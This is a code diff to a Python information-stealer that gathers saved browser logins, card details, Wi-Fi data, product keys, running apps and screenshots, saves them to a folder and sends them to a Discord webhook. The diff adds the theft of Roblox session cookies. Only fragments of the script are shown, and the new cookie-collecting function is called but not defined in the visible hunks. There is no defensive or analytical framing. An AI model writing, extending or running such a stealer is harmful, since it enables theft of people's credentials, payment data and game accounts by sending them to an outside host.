@@ -1,9 +1,9 @@
+import requests
 import os
 import shutil
 import subprocess
 import pychromepass
 import pyautogui
-import requests
 import pywifi
 import psutil
 import wmi
@@ -20,6 +20,7 @@ collect_pc_specs = True
 collect_running_apps = True
 collect_screenshot = True
 collect_microsoft_info = True
+collect_roblox_info = True
 
 # Define the Discord webhook URL
 webhook_url = 'YOUR_DISCORD_WEBHOOK_URL'
@@ -170,7 +171,7 @@ def get_microsoft_info():
         return None, None
 
 # Function to save collected information to folders
-def save_info_to_folders(product_key, login_details, card_details, wifi_networks, pc_specs, running_apps, screenshot):
+def save_info_to_folders(product_key, login_details, card_details, wifi_networks, pc_specs, running_apps, screenshot, roblox_cookies):
     try:
         folder_path = 'recovered-info'
         os.makedirs(folder_path, exist_ok=True)
@@ -196,6 +197,10 @@ def save_info_to_folders(product_key, login_details, card_details, wifi_networks
         # Save Wi-Fi networks
         with open(os.path.join(folder_path, 'Wi-Fi.txt'), 'w') as f:
             f.write(wifi_networks)
+        
+        # Save Roblox cookies
+        with open(os.path.join(folder_path, 'roblox_cookies.txt'), 'w') as f:
+            f.write(roblox_cookies)
         
         # Save screenshot
         shutil.copy(screenshot, folder_path)
@@ -235,8 +240,11 @@ if __name__ == "__main__":
     
     # Check if any data is collected
     if any([product_key, login_details, card_details, wifi_networks, pc_specs, running_apps, screenshot]):
+        # Get Roblox cookies
+        roblox_cookies = get_roblox_cookies() if collect_roblox_info else None
+        
         # Save collected information
-        save_info_to_folders(product_key, login_details, card_details, wifi_networks, pc_specs, running_apps, screenshot)
+        save_info_to_folders(product_key, login_details, card_details, wifi_networks, pc_specs, running_apps, screenshot, roblox_cookies)
         
         # Send data to Discord webhook
         send_to_discord_webhook()
